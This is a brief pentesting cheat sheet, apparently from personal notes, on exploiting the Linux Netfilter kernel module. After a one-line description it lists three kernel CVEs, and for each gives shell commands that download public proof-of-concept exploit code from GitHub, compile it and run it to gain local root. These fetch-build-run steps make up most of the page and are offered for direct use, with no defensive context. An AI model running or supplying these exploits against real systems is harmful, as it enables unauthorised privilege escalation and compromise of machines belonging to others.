# Netfilter

like firewall but on Linux kernel which analyze each packet

Netfilter is a Linux kernel module responsible for packet filtering, NAT, and firewall rules. It interacts with tools like `iptables` and can be exploited via several known vulnerabilities.

have 3 CVE popular

```bash
uname -r 
```

***

**CVE-2021-22555**

```bash
wget <https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c>
gcc -m32 -static exploit.c -o exploit
./exploit
```

**CVE-2022-25636**

```bash
git clone <https://github.com/Bonfee/CVE-2022-25636.git>
cd CVE-2022-25636
make
./exploit
```

**CVE-2023-32233**

```bash
git clone <https://github.com/Liuk3r/CVE-2023-32233>
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```
